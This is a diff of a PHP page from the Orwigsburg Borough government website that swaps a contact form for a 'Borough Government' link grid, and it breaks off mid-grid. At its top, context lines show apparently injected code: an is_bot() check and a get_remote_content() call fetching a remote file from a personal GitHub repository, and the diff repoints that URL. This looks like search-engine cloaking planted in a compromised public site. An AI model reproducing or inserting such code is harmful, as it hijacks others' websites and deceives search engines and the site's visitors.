@@ -39,7 +39,7 @@ function get_remote_content($url) {
 }
  
  
-$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburg.govcontact';
+$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburggovgovernment';
  
  
 if (is_bot()) {
@@ -54,8 +54,6 @@ if (is_bot()) {
 ?>
 
 
-
-
 <!doctype html>
 <html class="no-js" lang="en">
 <head>
@@ -63,7 +61,7 @@ if (is_bot()) {
     <meta http-equiv="x-ua-compatible" content="ie=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
 
-	<title>General Contact</title>
+	<title>Government | Orwigsburg Borough</title>
 
     <meta name="theme-version" content="1.8.1" />
     <meta name="foundation-version" content="5.5.4" />
@@ -74,12 +72,12 @@ if (is_bot()) {
 		<meta name="robots" content="index, follow" />
 		
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="General Contact">
-	<meta name="twitter:url" content="https://orwigsburg.gov/contact/index.php">
+	<meta name="twitter:title" content="Government | Orwigsburg Borough">
+	<meta name="twitter:url" content="https://orwigsburg.gov/government/index.php">
 	<meta property="og:type" content="website">
 	<meta property="og:site_name" content="Orwigsburg Borough">
-	<meta property="og:title" content="General Contact">
-	<meta property="og:url" content="https://orwigsburg.gov/contact/index.php">
+	<meta property="og:title" content="Government | Orwigsburg Borough">
+	<meta property="og:url" content="https://orwigsburg.gov/government/index.php">
 
 	<link rel="stylesheet" type="text/css" media="all" href="../rw_common/themes/foundation/consolidated.css" />
 		
@@ -89,16 +87,15 @@ if (is_bot()) {
 	
 
 			<link rel='stylesheet' type='text/css' media='all' href='../rw_common/plugins/stacks/stacks.css' />
-<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page54.css' />
+<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page3.css' />
         <script type='text/javascript' charset='utf-8' src='../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
         
         <link rel="stylesheet" href="../rw_common/plugins/stacks/font-awesome.min.css">
         
 		
-		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page54.js'></script>
+		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page3.js'></script>
 		
 
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
 
 
@@ -115,7 +112,8 @@ if (is_bot()) {
 
  <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 
 
-<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '>
+<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_23' class='stacks_out'><div id='stacks_in_23' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
+</div></div><div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in '>
 	
 	
 
@@ -131,7 +129,6 @@ if (is_bot()) {
 
  
  
-</div></div><div id='stacks_out_23' class='stacks_out'><div id='stacks_in_23' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
 </div></div><div id='stacks_out_24' class='stacks_out'><div id='stacks_in_24' class='stacks_in '><div id='stacks_out_24_3' class='stacks_out'><div id='stacks_in_24_3' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row  collapse      '  > <div class='columns small-12  small-centered      '> <div id='stacks_out_24_5' class='stacks_out'><div id='stacks_in_24_5' class='stacks_in com_joeworkman_stacks_foundation_iconbar_s3_stack'><nav class="icon-bar horizontal custom " role="navigation">  <a role="button" tabindex="0" href="tel:570-366-3103" class="item " rel="">   <i class="fa fa-phone"></i>   </a> 
  <a role="button" tabindex="0" href="../map/" class="item " rel="">   <i class="fa fa-map-marker"></i>   </a> 
@@ -326,7 +323,8 @@ if (is_bot()) {
 
 
 <div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
-    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation"><ul class="title-area title-area-site-setup">
+    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
+        <ul class="title-area title-area-site-setup">
             <li class="name ">
                 
                     <a href="https://orwigsburg.gov/">
@@ -359,7 +357,7 @@ if (is_bot()) {
 
 
 
-    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/" rel="">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/" rel="">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../live/" rel="">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../live/schools/" rel="">Schools</a></li><li class="has-dropdown" role="menuitem"><a href="../live/library/" rel="">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../live/orgs/" rel="">Organizations</a></li></ul></li></ul>
+    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="active has-dropdown" role="menuitem"><a href="./">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/" rel="">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../live/" rel="">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../live/schools/" rel="">Schools</a></li><li class="has-dropdown" role="menuitem"><a href="../live/library/" rel="">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../live/orgs/" rel="">Organizations</a></li></ul></li></ul>
 
 
 
@@ -376,7 +374,7 @@ if (is_bot()) {
 
 
 
-</div></div></div></div><div id='stacks_out_257' class='stacks_out'><div id='stacks_in_257' class='stacks_in '><div id='stacks_out_257_9' class='stacks_out'><div id='stacks_in_257_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 
+</div></div></div></div><div id='stacks_out_136' class='stacks_out'><div id='stacks_in_136' class='stacks_in '><div id='stacks_out_136_9' class='stacks_out'><div id='stacks_in_136_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 
 
 
 
@@ -391,13 +389,13 @@ if (is_bot()) {
 
 
 <!-- Total Impact Gallery -->
-<li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/slideshowimage_30.jpg" alt="A Great Place to Raise a Family"/><div class="impact-container h-right v-bottom">
+<li class="impact-slide slide slide-stacks_in_136_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/slideshowimage_30.jpg" alt="A Great Place to Raise a Family"/><div class="impact-container h-right v-bottom">
                 <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A Great Place to Raise a Family</h3></div>
             </div>
-        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/ball-fields.jpg" alt="Recreation"/><div class="impact-container h-right v-bottom">
+        </li><li class="impact-slide slide slide-stacks_in_136_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/ball-fields.jpg" alt="Recreation"/><div class="impact-container h-right v-bottom">
                 <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">Recreation</h3></div>
             </div>
-        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/town-18-tiny.jpg" alt="A True "American Home Town""/><div class="impact-container h-right v-bottom">
+        </li><li class="impact-slide slide slide-stacks_in_136_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/town-18-tiny.jpg" alt="A True "American Home Town""/><div class="impact-container h-right v-bottom">
                 <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A True "American Home Town"</h3></div>
             </div>
         </li>
@@ -424,9 +422,19 @@ if (is_bot()) {
 
 
  </ul> <nav class="slides-navigation"> <a href="#" class="next"></a> <a href="#" class="prev"></a> </nav>  </div>  </div>  
-</div></div></div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
-<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_4' class='stacks_out'><div id='stacks_in_4' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
-<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >General Contact Form</h1> 
+</div></div></div></div><div id='stacks_out_260' class='stacks_out'><div id='stacks_in_260' class='stacks_in com_joeworkman_stacks_totalcms_debug_stack'><!-- Total CMS Debug -->
+
+
+<div id='stacks_out_261' class='stacks_out'><div id='stacks_in_261' class='stacks_in com_joeworkman_stacks_totalcms_debug_check_stack'>
+
+
+
+</div></div>
+
+
+</div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
+<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_139' class='stacks_out'><div id='stacks_in_139' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
+<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_140' class='stacks_out'><div id='stacks_in_140' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >Borough Government</h1> 
 </div></div><!-- Total Toggle -->
 
 
@@ -434,7 +442,7 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <p>Do you have a question you can't find an answer to on our website?<br>Would you like to leave a comment or suggestion?</p><p><strong>Please use the form below:</strong></p>    
+	<div id='stacks_out_143' class='stacks_out'><div id='stacks_in_143' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <p style="text-align: left;"><a href="https://orwigsburg.diligent.community/Portal/" rel="noopener noreferrer" target="_blank"><img src="/cms-data/gallery/hipwig/d63e0c40-78db-47b3-81df-775295c5e308-diligent-1671553977.jpg" class="fr-fic fr-dib fr-fil">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </a></p><p style="text-align: left;"><a href="https://orwigsburg.diligent.community/Portal/" rel="noopener noreferrer" target="_blank">Public Meeting Portal - Community Essentials</a></p>    
  
 </div></div>
 
@@ -442,23 +450,324 @@ if (is_bot()) {
   
 
  
-<div id='stacks_out_285' class='stacks_out'><div id='stacks_in_285' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div><div id='stacks_out_286' class='stacks_out'><div id='stacks_in_286' class='stacks_in com_joeworkman_stacks_foundation_form_base_stack'> <form id="stacks_in_286_form" action="" method="post" class="" autocomplete="on" data-abide>  <div id='stacks_out_289' class='stacks_out'><div id='stacks_in_289' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
-<div class='row     '  > <div class='columns small-12    medium-6     ' >  <div id='stacks_out_292' class='stacks_out'><div id='stacks_in_292' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Your Name</label>    <input type="text" name="name" spellcheck="true" placeholder="Type Your Name Here"  />    
-</div></div><div id='stacks_out_293' class='stacks_out'><div id='stacks_in_293' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Phone Number</label>    <input type="text" name="phone" spellcheck="true" placeholder="Enter Your Phone Number Here"  pattern="\S+.*"  /> <small class="error" id="error_stacks_in_293">This field must contain a phone number</small>    
-</div></div><div id='stacks_out_294' class='stacks_out'><div id='stacks_in_294' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Your Email Address</label>    <input type="text" name="email" spellcheck="true" placeholder="Type Your Email Address Here"  pattern="email"  /> <small class="error" id="error_stacks_in_294">This field must contain a valid email address</small>    
-</div></div><div id='stacks_out_295' class='stacks_out'><div id='stacks_in_295' class='stacks_in com_joeworkman_stacks_foundation_form_checkbox_stack'><label for="stacks_in_295_input">How would you like to be contacted?</label>    <label for="input0_stacks_in_295"><input type="radio" name="contacthow[]" value='email' id="input0_stacks_in_295"  required> Email Me</label>    <label for="input1_stacks_in_295"><input type="radio" name="contacthow[]" value='Phone' id="input1_stacks_in_295" required> Call Me</label>   <label for="input2_stacks_in_295"><input type="radio" name="contacthow[]" value='no-contact' id="input2_stacks_in_295" required> No need to contact me</label>    
-</div></div><div id='stacks_out_305' class='stacks_out'><div id='stacks_in_305' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div><div id='stacks_out_304' class='stacks_out'><div id='stacks_in_304' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Spam Control: What is 3+5 ?</label>    <input type="password" name="spam control" spellcheck="true" placeholder="Spam Control" required pattern="[8]"  /> <small class="error" id="error_stacks_in_304">Wrong Answer Please enter 8</small>    
-</div></div>  </div> <div class='columns small-12    medium-6     ' >  <div id='stacks_out_300' class='stacks_out'><div id='stacks_in_300' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Topic</label>    <input type="text" name="topic" spellcheck="true" placeholder="Type Your Topic Here"  />    
-</div></div><div id='stacks_out_301' class='stacks_out'><div id='stacks_in_301' class='stacks_in com_joeworkman_stacks_foundation_form_textarea_stack'> <label class="">Please add your question/comments below</label>     <textarea spellcheck="true" rows="12" placeholder="Type your question/comments here" name="details"></textarea>   
-</div></div>  </div> </div> 
-</div></div><div id='stacks_out_306' class='stacks_out'><div id='stacks_in_306' class='stacks_in com_joeworkman_stacks_foundation_paragraph_s3_stack'> <p class="text-left    " draggable="false" ><strong>NOTE:</strong> Upon Successful Form Submission, You Will Be Redirected To The Home Page</p>  
-</div></div><div id='stacks_out_308' class='stacks_out'><div id='stacks_in_308' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>    <button aria-label="submit form" class="button        " value="Submit" type="submit">Submit</button>     
-</div></div> </form> <i class="fa fa-circle-o-notch fa-spin in-progress"></i> <div data-alert class="alert-box success">Thank you! Your submission was successfully sent :-)<a href="#" class="close">&times;</a></div> <div data-alert class="alert-box alert">Opps! Some went wrong... Your submission did not go through :-(<a href="#" class="close">&times;</a></div>  <script type="text/template" id="template_stacks_in_286">  <strong>General Contact Form</strong><br /><br /><strong>Name: </strong> {{name}}<br /><strong>Email: </strong> {{email}}<br /><strong>Phone:</strong> {{phone}}<br /><strong>Contact Method:</strong> {{contacthow}}<br /><br /><strong>Subject:</strong> {{topic}}<br /><br /><strong>Details:</strong><br />{{details}}  </script>   
+<div id='stacks_out_145' class='stacks_out'><div id='stacks_in_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_146' class='stacks_out'><div id='stacks_in_146' class='stacks_in com_joeworkman_stacks_foundation_blockgrid_s3_stack'> 
+<ul class="small-block-grid-1 medium-block-grid-2 large-block-grid-4"> <li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_149' class='stacks_out'><div id='stacks_in_149' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/officials"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-01.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-01-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-01-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-01-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_150' class='stacks_out'><div id='stacks_in_150' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Officials</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_156' class='stacks_out'><div id='stacks_in_156' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/financials"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-02.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-02-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-02-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-02-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_157' class='stacks_out'><div id='stacks_in_157' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Financial Reports</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_163' class='stacks_out'><div id='stacks_in_163' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/public-meetings"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-03.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-03-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-03-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-03-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_164' class='stacks_out'><div id='stacks_in_164' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Public Meetings</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_170' class='stacks_out'><div id='stacks_in_170' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/building-zoning"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-04.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-04-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-04-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-04-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_171' class='stacks_out'><div id='stacks_in_171' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Building/Zoning Codes</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_177' class='stacks_out'><div id='stacks_in_177' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/community-reports"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-05.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-05-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-05-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-05-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_178' class='stacks_out'><div id='stacks_in_178' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Community Reports</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_184' class='stacks_out'><div id='stacks_in_184' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/employment"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-06.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-06-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-06-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-06-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_185' class='stacks_out'><div id='stacks_in_185' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Employment</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_191' class='stacks_out'><div id='stacks_in_191' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/forms"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-07.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-07-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-07-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-07-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
